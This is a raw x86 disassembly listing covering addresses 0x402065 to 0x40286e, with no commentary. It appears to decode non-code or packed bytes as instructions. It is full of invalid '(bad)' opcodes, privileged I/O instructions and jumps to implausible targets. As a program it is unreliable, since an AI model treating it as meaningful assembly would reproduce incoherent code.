  402065:	cmp    bh,BYTE PTR [esi]
  402067:	ja     0x402064
  402069:	pop    edi
  40206a:	aaa    
  40206b:	call   0xd36c:0x1df5d428
  402072:	mov    eax,ds:0x10c1c094
  402077:	push   0xc668ea33
  40207c:	mov    ebx,0xdfa74fae
  402081:	(bad)  [eax]
  402083:	mov    dh,0xd6
  402085:	xor    bl,BYTE PTR [edx+0x26]
  402088:	push   cs
  402089:	inc    edi
  40208a:	mov    BYTE PTR [edi],cl
  40208c:	push   0x5d9c0512
  402091:	daa    
  402092:	xchg   edx,eax
  402093:	and    edi,eax
  402095:	addr16 aam 0xf3
  402098:	call   0x35a634f6
  40209d:	mov    ebx,0x62b0e9c8
  4020a2:	sub    BYTE PTR [edi],0x7
  4020a5:	inc    ebx
  4020a6:	scas   eax,DWORD PTR es:[edi]
  4020a7:	cwde   
  4020a8:	lahf   
  4020a9:	push   ecx
  4020aa:	adc    eax,0x2462f9c3
  4020af:	sahf   
  4020b0:	out    dx,al
  4020b1:	mov    dh,0xb
  4020b3:	(bad)  
  4020b4:	xor    ch,bh
  4020b6:	dec    ebx
  4020b7:	shl    BYTE PTR [eax+eiz*4+0xd],0xd5
  4020bc:	and    eax,0x241fa
  4020c1:	xchg   ecx,eax
  4020c2:	popf   
  4020c3:	fsub   QWORD PTR [eax+0x7519baf2]
  4020c9:	sbb    ecx,esi
  4020cb:	and    DWORD PTR [edx],ebx
  4020cd:	sbb    eax,DWORD PTR [edi+0x51511c44]
  4020d3:	ret    
  4020d4:	add    DWORD PTR [ebx],esi
  4020d6:	xor    edi,edi
  4020d8:	sbb    BYTE PTR [edi-0x6d],ah
  4020db:	dec    ecx
  4020dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020dd:	dec    edx
  4020de:	cmp    DWORD PTR [eax],ebx
  4020e0:	sar    DWORD PTR [edi-0x7f],0x72
  4020e4:	out    dx,eax
  4020e5:	fistp  DWORD PTR [esi+0x7e]
  4020e8:	jo     0x40214a
  4020ea:	mov    ah,BYTE PTR [ebx+0x3efc5723]
  4020f0:	retf   
  4020f1:	add    edi,DWORD PTR ss:[eax+0x1052bc0c]
  4020f8:	sub    BYTE PTR ds:0x9df79acf,cl
  4020fe:	cmp    eax,0x6d8f3b91
  402103:	lock sub DWORD PTR [esp+ebx*8+0x77c964d],edi
  40210b:	xchg   ecx,eax
  40210c:	or     DWORD PTR [ecx],esi
  40210e:	popf   
  40210f:	ja     0x40210e
  402111:	push   edx
  402112:	test   eax,0x9c7375e0
  402117:	iret   
  402118:	iret   
  402119:	pop    esp
  40211a:	and    eax,0x78d686f7
  40211f:	mov    ?,esi
  402121:	aam    0x4d
  402123:	lahf   
  402124:	or     al,BYTE PTR [ebx+0x623b2def]
  40212a:	xchg   ebx,eax
  40212b:	sbb    cl,BYTE PTR [ebp+0x35]
  40212e:	hlt    
  40212f:	mov    eax,ds:0x70c3373f
  402134:	or     eax,0xffffffec
  402137:	sub    BYTE PTR [eax],al
  402139:	add    ebp,DWORD PTR [esi]
  40213b:	loopne 0x402179
  40213d:	loope  0x40211f
  40213f:	enter  0xa62e,0xf0
  402143:	aam    0xa1
  402145:	imul   edi,DWORD PTR [eax+0x3a964cb0],0x1c
  40214c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40214e:	mov    edi,0xfafd27b5
  402153:	clc    
  402154:	xchg   edi,eax
  402155:	cmp    BYTE PTR [ebp+0x14],bl
  402158:	inc    ecx
  402159:	out    dx,al
  40215a:	test   eax,0x98813779
  40215f:	jno    0x4021b1
  402161:	pand   mm2,QWORD PTR [eax-0x75]
  402165:	or     ecx,DWORD PTR [edi]
  402167:	cmp    DWORD PTR [edx+ebx*1-0x2e03c6ca],edi
  40216e:	test   dl,ch
  402170:	adc    esp,DWORD PTR [ebp+eiz*8+0x69]
  402174:	mov    dh,ch
  402176:	or     bh,ch
  402178:	or     ch,BYTE PTR [ebp+0xd2941a]
  40217e:	jb     0x402192
  402180:	mov    bh,0xaa
  402182:	jae    0x40214c
  402184:	sub    eax,0xe125e757
  402189:	cmc    
  40218a:	ret    0x9694
  40218d:	idiv   DWORD PTR [edx]
  40218f:	mov    al,0x16
  402191:	adc    eax,0xdcf28e0f
  402196:	cmp    al,0x45
  402198:	jns    0x402137
  40219a:	loopne 0x402210
  40219c:	les    ecx,FWORD PTR [esi-0x6a]
  40219f:	xor    al,0x9f
  4021a1:	ja     0x402180
  4021a3:	push   ecx
  4021a4:	dec    ebx
  4021a5:	push   es
  4021a6:	dec    esi
  4021a7:	push   esi
  4021a9:	dec    ebx
  4021aa:	loop   0x40215c
  4021ac:	push   ss
  4021ad:	mov    ebx,0x9505fa51
  4021b2:	jl     0x402142
  4021b4:	test   al,0xc2
  4021b6:	je     0x402139
  4021b8:	jne    0x402175
  4021ba:	pop    edi
  4021bb:	inc    esp
  4021bc:	cmp    BYTE PTR [ecx+0x75],dh
  4021bf:	pop    eax
  4021c0:	rol    BYTE PTR [ebx+ebp*8],cl
  4021c3:	out    dx,eax
  4021c4:	or     DWORD PTR [ecx-0x60],eax
  4021c7:	fs inc edi
  4021c9:	and    al,0x53
  4021cb:	sbb    eax,0x33ca909b
  4021d0:	or     ecx,DWORD PTR [edx]
  4021d2:	es mov edi,0xdb7721a1
  4021d8:	fistp  WORD PTR [ecx-0x59]
  4021db:	ss mul ebp
  4021de:	aas    
  4021df:	push   cs
  4021e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e1:	sti    
  4021e2:	push   ebp
  4021e3:	aad    0xc6
  4021e5:	sahf   
  4021e6:	xor    cl,BYTE PTR [edx]
  4021e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e9:	sbb    eax,0xbbe3a2a
  4021ee:	or     cl,BYTE PTR ds:[eax]
  4021f1:	mov    ch,0x51
  4021f3:	inc    edi
  4021f4:	jge    0x40224a
  4021f6:	dec    eax
  4021f7:	xchg   ecx,eax
  4021f8:	cmp    DWORD PTR [eax-0x44612b26],0x3728b87f
  402202:	mov    BYTE PTR [ebp-0x58],ah
  402205:	je     0x402199
  402207:	test   al,0xdd
  402209:	sbb    al,0xf8
  40220b:	mov    eax,0x29d31575
  402210:	test   DWORD PTR [esi-0x5f0770e],ecx
  402216:	mov    esi,0x289616dd
  40221b:	push   ebp
  40221c:	sti    
  40221d:	(bad)
  402220:	pop    es
  402221:	(bad)  
  402222:	in     al,0x48
  402224:	ins    BYTE PTR es:[edi],dx
  402225:	add    dh,BYTE PTR [edi]
  402227:	mov    esp,0x3a88d55c
  40222c:	call   0xdc0d3275
  402231:	cmc    
  402232:	mov    eax,0x4f622882
  402237:	sub    DWORD PTR [eax],ebp
  402239:	xchg   esp,eax
  40223a:	sbb    BYTE PTR [esi+esi*1-0x2d],ah
  40223e:	bound  bp,DWORD PTR [ecx]
  402241:	cmp    ah,ah
  402243:	push   ecx
  402244:	and    BYTE PTR [esi+0x4f672f21],dl
  40224a:	mov    ecx,0xecbc90f
  40224f:	xchg   esi,eax
  402250:	sub    DWORD PTR [ebx-0x437b707b],0xffffff95
  402257:	or     eax,0x59df5199
  40225c:	into   
  40225d:	sbb    eax,0x9ae8945a
  402262:	and    eax,0x8d86f76
  402267:	fisub  WORD PTR [eax]
  402269:	cmc    
  40226a:	mov    edi,0xc71cf8ce
  40226f:	push   ds
  402270:	add    al,0xed
  402272:	hlt    
  402273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402274:	(bad)  
  402275:	int3   
  402276:	mov    DWORD PTR ss:[eax+ebp*1-0x6595d70],esi
  40227e:	inc    ecx
  40227f:	mov    bh,0x37
  402281:	call   0xf2e7aa1a
  402286:	cs pop ebx
  402288:	repz dec ecx
  40228a:	sub    edi,DWORD PTR [esi]
  40228c:	das    
  40228d:	retf   
  40228e:	outs   dx,DWORD PTR ds:[esi]
  40228f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402290:	push   0xffffffbf
  402292:	leave  
  402293:	repnz les edx,FWORD PTR [esi+0x7a]
  402297:	pop    ds
  402298:	adc    ah,BYTE PTR [eax+0x145b8f72]
  40229e:	popa   
  40229f:	add    al,0x4e
  4022a1:	xor    bl,BYTE PTR [ebx-0x2e215020]
  4022a7:	push   ebp
  4022a8:	push   0xffffffd4
  4022aa:	pushf  
  4022ab:	dec    DWORD PTR ds:0xa52ca759
  4022b1:	addr16 dec ebx
  4022b3:	mov    cl,0xef
  4022b5:	and    DWORD PTR [esi+0x16],0x4e
  4022b9:	mov    ebp,0x13f57af8
  4022be:	adc    BYTE PTR [esi],bl
  4022c0:	push   esi
  4022c1:	pusha  
  4022c2:	jb     0x402288
  4022c4:	xor    edx,edx
  4022c6:	mov    BYTE PTR [eax+0x116ad8b0],dh
  4022cc:	xchg   edx,eax
  4022cd:	sub    eax,0xc6337309
  4022d2:	pusha  
  4022d3:	jge    0x402261
  4022d5:	mov    BYTE PTR [ecx],bl
  4022d7:	xchg   BYTE PTR [ebx+eiz*1+0x35cb4806],dh
  4022de:	daa    
  4022df:	mov    ds:0xbed87b10,al
  4022e4:	add    DWORD PTR [edx+0x6],0x67
  4022e8:	jle    0x40226a
  4022ea:	iret   
  4022eb:	into   
  4022ec:	mov    ebp,0xfb611120
  4022f1:	sub    ebp,DWORD PTR [ecx+eiz*2+0x64df7ec2]
  4022f8:	cmp    al,0xd6
  4022fa:	fidivr DWORD PTR [edi]
  4022fc:	into   
  4022fd:	and    al,0xcf
  4022ff:	jg     0x4022ae
  402301:	ret    0x3cba
  402304:	dec    cl
  402306:	mov    edi,0xa09c5539
  40230b:	imul   DWORD PTR [esi+0x2e916abe]
  402311:	add    eax,0x25eb7042
  402316:	mov    BYTE PTR [edx-0x6224aa72],al
  40231c:	pop    esi
  40231d:	lahf   
  40231e:	xor    al,0xa
  402320:	jne    0x4022d4
  402322:	(bad)  
  402324:	pusha  
  402325:	retf   0xb60c
  402328:	cmp    DWORD PTR [ebx+0x621473ed],0xad51b5da
  402332:	mov    es,esp
  402334:	add    BYTE PTR [ecx],ch
  402336:	shl    dl,1
  402338:	mov    esp,0xc80508bd
  40233d:	jp     0x40234d
  40233f:	data16 (bad) 
  402341:	js     0x4023bd
  402343:	(bad)  
  402344:	pop    eax
  402345:	outs   dx,BYTE PTR ds:[esi]
  402346:	cmp    ebx,DWORD PTR ds:0x93397bb5
  40234c:	sti    
  40234d:	ss or  eax,0x99e4370c
  402353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402354:	xchg   esi,eax
  402355:	sub    eax,0x812fd331
  40235a:	mov    cl,0xc8
  40235c:	mov    ebp,0x338e21c5
  402361:	loope  0x402355
  402363:	pusha  
  402364:	shr    BYTE PTR [eax+0x16],0xad
  402368:	pop    ss
  402369:	in     al,dx
  40236a:	push   ebx
  40236b:	js     0x402313
  40236d:	sub    esi,DWORD PTR [eax+edi*8+0x7d145433]
  402374:	(bad)  
  402375:	enter  0xa2c4,0x8d
  402379:	ss pop edx
  40237b:	(bad)  
  40237c:	or     eax,ecx
  40237e:	pop    esp
  40237f:	loopne 0x4023d0
  402381:	(bad)  
  402382:	repnz dec BYTE PTR [edi]
  402385:	jo     0x402336
  402387:	and    DWORD PTR [esi],eax
  402389:	out    0x7,eax
  40238b:	mov    DWORD PTR ds:0xf7507d6,ecx
  402391:	mov    esp,0xd8103277
  402396:	pusha  
  402397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402398:	mov    dl,0xdf
  40239a:	fwait
  40239b:	dec    esp
  40239c:	in     eax,0xd6
  40239e:	lods   al,BYTE PTR ds:[esi]
  40239f:	push   ebx
  4023a0:	imul   esp,DWORD PTR [edi-0x1e9f540d],0x3
  4023a7:	bnd jge 0x4023e0
  4023aa:	rol    DWORD PTR [edi+0x1826602d],cl
  4023b0:	or     DWORD PTR [edx+ebp*4+0xc20b53b],esp
  4023b7:	and    ebp,edi
  4023b9:	dec    ebp
  4023ba:	fimul  WORD PTR [ecx]
  4023bc:	repz mov ebx,0xd0fe42b4
  4023c2:	rcl    BYTE PTR [edx*4-0x4210342e],0xf8
  4023ca:	repz (bad) 
  4023cc:	xchg   ebp,eax
  4023cd:	sbb    DWORD PTR [ecx-0x5040cf93],esp
  4023d3:	fs push esp
  4023d5:	mov    ecx,0x5df201c8
  4023da:	fldz   
  4023dc:	hlt    
  4023dd:	stc    
  4023de:	mov    cl,BYTE PTR [eax+0x49]
  4023e1:	push   ebx
  4023e2:	cmp    eax,0xe039e070
  4023e7:	xchg   esi,eax
  4023e8:	adc    BYTE PTR [edx],cl
  4023ea:	and    edi,DWORD PTR [edx]
  4023ec:	cmc    
  4023ed:	jg     0x402455
  4023ef:	xor    eax,0xe20dfccf
  4023f4:	in     eax,0x57
  4023f6:	(bad)  
  4023f7:	mov    al,0x66
  4023f9:	(bad)  
  4023fa:	fdivrp st(3),st
  4023fc:	adc    DWORD PTR ds:0x5599e856,ebx
  402402:	pop    eax
  402403:	outs   dx,BYTE PTR ds:[esi]
  402404:	outs   dx,BYTE PTR ds:[esi]
  402405:	push   edi
  402406:	cwde   
  402407:	pop    eax
  402408:	cli    
  402409:	mov    eax,0xe9936ae5
  40240e:	loope  0x402486
  402410:	loopne 0x4023ea
  402412:	and    DWORD PTR [ecx-0x72],ebx
  402415:	lods   eax,DWORD PTR ds:[esi]
  402416:	popa   
  402417:	xchg   edx,eax
  402418:	jmp    0x9669:0xcb8e0d2
  40241f:	jmp    0x402494
  402421:	lods   al,BYTE PTR ds:[esi]
  402422:	lods   eax,DWORD PTR ds:[esi]
  402423:	adc    cl,BYTE PTR [esi+0x17]
  402426:	lock add dh,BYTE PTR [edx]
  402429:	scas   al,BYTE PTR es:[edi]
  40242a:	jp     0x402418
  40242c:	push   ds
  40242d:	call   0xdbb60e3a
  402432:	adc    ecx,DWORD PTR [ecx]
  402434:	sub    al,0xd4
  402436:	jo     0x4024b3
  402438:	cld    
  402439:	div    BYTE PTR [eax+0x7f]
  40243c:	cdq    
  40243d:	mov    ah,0x4e
  40243f:	adc    ebp,ebx
  402441:	jno    0x40241c
  402443:	fimul  DWORD PTR ss:[ebp+0x70772065]
  40244a:	inc    edi
  40244b:	inc    ecx
  40244c:	in     al,0xc8
  40244e:	(bad)  
  402450:	jmp    0x40243e
  402452:	jmp    0x402452
  402454:	lahf   
  402455:	sub    DWORD PTR [ebp+0x4d],edx
  402458:	frstor [eax-0x1a]
  40245b:	pop    ss
  40245c:	aaa    
  40245d:	adc    al,0x18
  40245f:	sbb    eax,0x2abfff3
  402464:	mov    ebp,0x186f4651
  402469:	idiv   DWORD PTR [ebx-0x11bf26f9]
  40246f:	push   ecx
  402470:	je     0x402471
  402472:	mov    esp,0xddd4a28b
  402477:	fstp   TBYTE PTR [ebp-0x74bbebcf]
  40247d:	stos   DWORD PTR es:[edi],eax
  40247e:	pop    ebx
  40247f:	outs   dx,DWORD PTR ds:[esi]
  402480:	ret    0x925
  402483:	inc    ebp
  402484:	jle    0x40247f
  402486:	loopne 0x4024e6
  402488:	cmp    cl,ah
  40248a:	sbb    eax,0x5202bfa8
  40248f:	clc    
  402490:	es mov cl,0x64
  402493:	inc    edx
  402494:	add    bl,bl
  402496:	inc    edx
  402497:	xchg   edi,eax
  402498:	xchg   ebp,eax
  402499:	pop    esp
  40249a:	push   0xffffffe5
  40249c:	mov    BYTE PTR [eax-0x56d0dc40],cl
  4024a2:	mov    al,ds:0x8cdaddaa
  4024a7:	xchg   ebx,eax
  4024a8:	push   ebx
  4024a9:	retf   
  4024aa:	es cs add eax,0x12dd2c87
  4024b1:	out    dx,eax
  4024b2:	fs aas 
  4024b4:	bsr    ebp,DWORD PTR [ebx-0xbdd78f]
  4024bb:	in     al,0xe8
  4024bd:	cmp    ch,ah
  4024bf:	inc    edx
  4024c0:	cmc    
  4024c1:	or     BYTE PTR [ecx-0x22],cl
  4024c4:	retf   0x6fbf
  4024c7:	cmp    eax,0xcf20bc80
  4024cc:	dec    esp
  4024cd:	imul   esi,DWORD PTR cs:[edi+ecx*8-0x45c9d11],0x1ee12735
  4024d9:	cwde   
  4024da:	push   ebx
  4024db:	mov    al,0xde
  4024dd:	addr16 mov ebp,0xfed02fc0
  4024e3:	fidiv  WORD PTR [ebp-0x5d07d79f]
  4024e9:	cmp    al,BYTE PTR [edx+0x66e17832]
  4024ef:	icebp  
  4024f0:	dec    esp
  4024f1:	iret   
  4024f2:	rcr    esi,0x2e
  4024f5:	push   ebx
  4024f6:	inc    esi
  4024f7:	and    BYTE PTR [edi-0x4c0c5580],0xc3
  4024fe:	ins    DWORD PTR es:[edi],dx
  4024ff:	cmp    DWORD PTR [eax-0x46dca300],ebx
  402505:	aas    
  402506:	sbb    eax,0x1f326448
  40250b:	cmp    DWORD PTR [eax+edi*1],ecx
  40250e:	popa   
  40250f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402510:	rol    DWORD PTR ds:[esi-0x6b228bc6],1
  402517:	pop    esi
  402518:	dec    esp
  402519:	xchg   edx,eax
  40251a:	xor    eax,0x75e93077
  40251f:	scas   al,BYTE PTR es:[edi]
  402520:	inc    esp
  402521:	inc    esi
  402522:	aad    0xba
  402524:	cwde   
  402525:	repz pop eax
  402527:	fstp   TBYTE PTR [ebp+0x3a]
  40252a:	cmp    eax,0xc78672d9
  40252f:	lods   al,BYTE PTR ds:[esi]
  402530:	mov    esi,0xbe361d0b
  402535:	clc    
  402536:	int    0xc3
  402538:	xchg   cl,al
  40253a:	mov    al,0xfd
  40253c:	adc    al,0xba
  40253e:	mov    eax,DWORD PTR [edx]
  402540:	adc    DWORD PTR [ebx],ebp
  402542:	jns    0x4024e3
  402544:	test   al,dh
  402546:	test   DWORD PTR [ebp+0x23970006],ebp
  40254c:	or     bh,cl
  40254e:	pop    ss
  40254f:	test   bl,0x34
  402552:	jne    0x4024fb
  402554:	aas    
  402555:	inc    esp
  402556:	jns    0x4024fa
  402558:	repnz out dx,al
  40255a:	push   ecx
  40255b:	call   0x1e05:0x33aea3be
  402562:	stos   DWORD PTR es:[edi],eax
  402563:	cmp    ebx,DWORD PTR [esi-0x2f]
  402566:	cld    
  402567:	jp     0x402581
  402569:	mov    eax,DWORD PTR [ebp+0x1ddf617f]
  40256f:	std    
  402570:	cmc    
  402571:	push   esi
  402572:	outs   dx,BYTE PTR ds:[esi]
  402573:	add    BYTE PTR [esp+ebp*1-0x27],bl
  402577:	fnsave [esi+eiz*1]
  40257a:	js     0x4025db
  40257c:	mov    dl,0x92
  40257e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40257f:	es aad 0xcb
  402582:	and    DWORD PTR [ebx],edi
  402584:	das    
  402585:	mov    edx,DWORD PTR [edi]
  402587:	jae    0x4025d0
  402589:	(bad)  
  40258a:	std    
  40258b:	jle    0x402571
  40258d:	aas    
  40258e:	nop
  40258f:	sbb    DWORD PTR [ecx+0x109188aa],eax
  402595:	push   cs
  402596:	stos   DWORD PTR es:[edi],eax
  402597:	inc    ebp
  402598:	dec    eax
  402599:	push   esp
  40259a:	jp     0x4025ae
  40259c:	rcl    BYTE PTR [ebp-0x2b],cl
  40259f:	js     0x4025f6
  4025a1:	pop    ebx
  4025a2:	jnp    0x402604
  4025a4:	fild   DWORD PTR [edx+0xb]
  4025a7:	jo     0x4025b0
  4025a9:	mov    al,0x8d
  4025ab:	push   esp
  4025ac:	(bad)  
  4025ad:	in     eax,0xd
  4025af:	push   0x1a210bec
  4025b4:	xor    dh,ah
  4025b6:	cmc    
  4025b7:	arpl   WORD PTR [eax+0x3e],sp
  4025ba:	push   ebp
  4025bb:	cmp    DWORD PTR [eax+0x44df1b73],0x9
  4025c2:	pop    ebp
  4025c3:	out    dx,eax
  4025c4:	dec    edx
  4025c5:	in     al,dx
  4025c6:	cli    
  4025c7:	xor    eax,0x876bc1a4
  4025cc:	inc    esi
  4025cd:	popf   
  4025ce:	jno    0x4025d7
  4025d0:	xchg   ecx,eax
  4025d1:	or     al,0x4f
  4025d3:	xor    BYTE PTR [ecx-0x3b25c461],dl
  4025d9:	div    BYTE PTR [ecx-0x25e00b4e]
  4025df:	or     al,0xae
  4025e1:	mov    ebp,0x5e14f243
  4025e6:	std    
  4025e7:	(bad)  
  4025e8:	push   esi
  4025e9:	arpl   WORD PTR [esi],bp
  4025eb:	mov    dh,0x3b
  4025ed:	lds    eax,FWORD PTR [ecx-0x38]
  4025f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025f1:	(bad)  cs:[edx+0x5]
  4025f5:	aad    0x39
  4025f7:	push   ecx
  4025f8:	(bad)  
  4025f9:	and    eax,0x39380513
  4025fe:	push   ds
  4025ff:	cmp    DWORD PTR [esi],esi
  402601:	das    
  402602:	push   cs
  402603:	xchg   esp,eax
  402604:	or     eax,0x8320b3c4
  402609:	vcvtsi2sd xmm1,xmm3,DWORD PTR [esp+esi*2]
  40260e:	mov    esp,0x69aeb40a
  402613:	xlat   BYTE PTR ds:[ebx]
  402614:	neg    BYTE PTR [ebx-0x6a]
  402617:	push   ds
  402618:	xor    eax,0x727a7b85
  40261d:	sbb    edx,ecx
  40261f:	psraw  xmm2,XMMWORD PTR [eax-0x3]
  402624:	popa   
  402625:	dec    esi
  402626:	ret    0x21e4
  402629:	xor    edx,DWORD PTR [esi]
  40262b:	add    edi,DWORD PTR [esi+0x4]
  40262e:	lds    esp,FWORD PTR [edx-0x33]
  402631:	mov    eax,ds:0x84c7dfa4
  402636:	clc    
  402637:	push   0x3dca17b2
  40263c:	fwait
  40263d:	cmp    al,0x28
  40263f:	add    DWORD PTR [edx+edx*8-0x286f1e53],eax
  402646:	xchg   edi,eax
  402647:	push   ebp
  402648:	mov    ch,0xd6
  40264a:	inc    ebx
  40264b:	mov    edx,0xb0973d3e
  402650:	add    eax,0xc05edb5
  402655:	les    ecx,FWORD PTR [edi+0x36]
  402658:	mov    dh,0x8f
  40265a:	xor    DWORD PTR [eax+0x68ee6947],ebp
  402660:	xor    al,0x1c
  402662:	test   BYTE PTR [edi-0x60cda2a1],bl
  402668:	gs pop eax
  40266a:	jmp    FWORD PTR [ecx-0x4242f433]
  402670:	out    dx,eax
  402671:	jo     0x402657
  402673:	mov    edi,DWORD PTR [esi+0x7462c756]
  402679:	aas    
  40267a:	push   0x9
  40267c:	ins    BYTE PTR es:[edi],dx
  40267d:	imul   ebx,DWORD PTR [edx-0x6d],0x4234beca
  402684:	cmp    eax,0xaa3c8edf
  402689:	jl     0x4026fb
  40268b:	fisttp QWORD PTR [ecx-0x617373e9]
  402691:	push   0xffffffa3
  402693:	js     0x4026a6
  402695:	inc    edx
  402696:	mov    es,WORD PTR [edi-0x7f9e8307]
  40269c:	cmp    bh,cl
  40269e:	ret    
  40269f:	jmp    DWORD PTR [esi-0x1]
  4026a2:	scas   al,BYTE PTR es:[edi]
  4026a3:	add    eax,0x60fb8010
  4026a8:	jg     0x40263f
  4026aa:	loope  0x402703
  4026ac:	jne    0x402666
  4026ae:	push   edx
  4026af:	pop    esi
  4026b0:	jl     0x402703
  4026b2:	xchg   DWORD PTR [eax+0x6],edi
  4026b5:	xor    esp,DWORD PTR [eax+0x24]
  4026b8:	iretw  
  4026ba:	push   0x6620d4ea
  4026bf:	sub    ecx,ecx
  4026c1:	xchg   esp,eax
  4026c2:	ins    DWORD PTR es:[edi],dx
  4026c3:	xchg   edi,eax
  4026c4:	xor    DWORD PTR [ebp-0x31c55ffd],esi
  4026ca:	pop    edi
  4026cb:	iret   
  4026cc:	clc    
  4026cd:	and    edi,esp
  4026cf:	xor    al,0x38
  4026d1:	js     0x4026ea
  4026d3:	mov    ds:0x50343762,eax
  4026d8:	adc    ah,BYTE PTR [eax]
  4026da:	sti    
  4026db:	xor    DWORD PTR [ecx+0x5c],ebx
  4026de:	sbb    eax,esp
  4026e0:	stos   DWORD PTR es:[edi],eax
  4026e1:	cmc    
  4026e2:	fsubr  DWORD PTR [esi]
  4026e4:	mov    ds:0x24315e21,eax
  4026e9:	in     eax,dx
  4026ea:	push   0x7408e013
  4026ef:	outs   dx,DWORD PTR ds:[esi]
  4026f0:	fldenv [edx+0x13ba3c5d]
  4026f6:	mov    DWORD PTR [ecx-0x19],ecx
  4026f9:	xchg   DWORD PTR [ebx],edx
  4026fb:	inc    ebx
  4026fc:	mov    bl,0x31
  4026fe:	cmp    ebp,ebp
  402700:	shl    DWORD PTR [esi+0x27],0xea
  402704:	xchg   ebp,eax
  402705:	or     al,0xb0
  402707:	ret    
  402708:	sub    BYTE PTR [edx],dl
  40270a:	fcomip st,st(3)
  40270c:	jns    0x40277a
  40270e:	sbb    ebx,DWORD PTR [edx-0x37]
  402711:	mov    eax,ds:0x989ac22f
  402716:	inc    esp
  402717:	sahf   
  402718:	cld    
  402719:	push   ebp
  40271a:	push   ebp
  40271b:	lock int 0x58
  40271e:	and    BYTE PTR [ebp-0x7ffb7f75],al
  402724:	sub    esi,DWORD PTR [ecx+ebx*1+0x3e]
  402728:	adc    dh,BYTE PTR [ebx+ebp*1-0x17425a9d]
  40272f:	faddp  st(1),st
  402731:	xchg   ebp,eax
  402732:	ins    BYTE PTR es:[edi],dx
  402733:	aam    0x3b
  402735:	jno    0x4027b6
  402737:	fnsave [esp+0x16]
  40273b:	fs in  eax,dx
  40273d:	mov    ?,WORD PTR [ecx+0x11]
  402740:	daa    
  402741:	aad    0x30
  402743:	sbb    edi,DWORD PTR [edi+ebx*1+0x6d]
  402747:	add    BYTE PTR ds:0xa27bdfb1,0xea
  40274e:	sbb    ch,BYTE PTR [esi+0x6c]
  402751:	pop    ds
  402752:	sbb    eax,0x42bf2f43
  402757:	adc    eax,0x8459521b
  40275c:	cmp    ebp,DWORD PTR [edx+0x34]
  40275f:	sahf   
  402760:	jns    0x402792
  402762:	stos   BYTE PTR es:[edi],al
  402763:	lods   al,BYTE PTR ds:[esi]
  402764:	dec    eax
  402765:	fistp  DWORD PTR [edi+eiz*4-0x2fc35683]
  40276c:	adc    eax,0xc429b4de
  402771:	dec    DWORD PTR [ecx+0x36248dbd]
  402777:	icebp  
  402778:	add    bh,BYTE PTR [ecx]
  40277a:	sub    eax,0xac7f7954
  40277f:	ucomiss xmm6,DWORD PTR [eax-0x37]
  402783:	mov    ebp,0xc2fb2931
  402788:	pop    ecx
  402789:	sbb    esp,DWORD PTR [edi-0x3c9960e6]
  40278f:	inc    ecx
  402790:	dec    edx
  402791:	arpl   si,bx
  402793:	pop    ecx
  402794:	daa    
  402795:	int3   
  402796:	fs cmp al,0xd1
  402799:	pop    esi
  40279a:	mov    esp,0x9bb71e76
  40279f:	sub    ah,dl
  4027a1:	mov    ah,0x6c
  4027a3:	jecxz  0x4027bf
  4027a5:	jno    0x40273c
  4027a7:	(bad)  
  4027a8:	shl    BYTE PTR [ebx-0x6],cl
  4027ab:	sbb    eax,0x72b092f8
  4027b0:	inc    ebp
  4027b1:	xor    eax,0x4795274d
  4027b6:	or     bl,dl
  4027b8:	or     ah,BYTE PTR [edx]
  4027ba:	xor    BYTE PTR [edi*8-0x70e29383],0x37
  4027c2:	jg     0x4027d2
  4027c4:	sbb    esp,edx
  4027c6:	pushf  
  4027c7:	mov    al,0xfb
  4027c9:	test   DWORD PTR [esi+0x2e57e41d],esi
  4027cf:	mov    dl,0x48
  4027d1:	jecxz  0x402838
  4027d3:	push   esi
  4027d4:	jbe    0x40281b
  4027d6:	dec    ecx
  4027d7:	push   ds
  4027d8:	outs   dx,BYTE PTR ds:[esi]
  4027d9:	push   cs
  4027da:	(bad)  
  4027db:	out    0x71,eax
  4027dd:	mov    eax,ds:0xce579733
  4027e2:	and    al,0x70
  4027e4:	push   cs
  4027e5:	std    
  4027e6:	mov    edx,0xa1352e26
  4027eb:	test   DWORD PTR [ecx],edi
  4027ed:	fisub  WORD PTR ds:0x18677364
  4027f3:	jne    0x4027b0
  4027f5:	pop    edx
  4027f6:	test   ah,0x4b
  4027f9:	into   
  4027fa:	mov    ah,BYTE PTR [ebp+ebp*2+0x27]
  4027fe:	xor    dh,bh
  402800:	mov    es,WORD PTR [ebx-0x501362bb]
  402806:	jle    0x402795
  402808:	or     dh,al
  40280a:	ins    DWORD PTR es:[edi],dx
  40280b:	aad    0xc0
  40280d:	shl    ebx,cl
  40280f:	int    0xc6
  402811:	fld    QWORD PTR [ebp+0x71]
  402814:	mov    ecx,0x32b91677
  402819:	mov    ds:0xdaa077a3,al
  40281e:	stos   DWORD PTR es:[edi],eax
  40281f:	pop    edx
  402820:	dec    ebp
  402821:	scas   eax,DWORD PTR es:[edi]
  402822:	adc    edi,edi
  402824:	jecxz  0x402811
  402826:	xor    edx,DWORD PTR [ebx+0x40771a9d]
  40282c:	arpl   WORD PTR [edi-0x38],cx
  40282f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402830:	mov    ebp,0x25e5b9ff
  402835:	jl     0x40287f
  402837:	jae    0x402829
  402839:	xor    BYTE PTR [eax],ch
  40283b:	adc    BYTE PTR [ecx],dh
  40283d:	push   0xffffffac
  40283f:	mov    ah,0x9
  402841:	mov    BYTE PTR [esi+ebx*1-0x7ead14cd],dh
  402848:	js     0x402826
  40284a:	iret   
  40284b:	dec    edi
  40284c:	cmp    BYTE PTR [esi-0x25],al
  40284f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402850:	call   0x9a5ab14e
  402855:	push   0x41e87645
  40285a:	and    BYTE PTR [esi+0x48],dh
  40285d:	or     BYTE PTR [edi-0x3],al
  402860:	lods   al,BYTE PTR ds:[esi]
  402861:	cmp    dl,BYTE PTR [eax+0x423127ff]
  402867:	adc    DWORD PTR [edi+0x1479bc53],0xffffffe3
  40286e:	into   
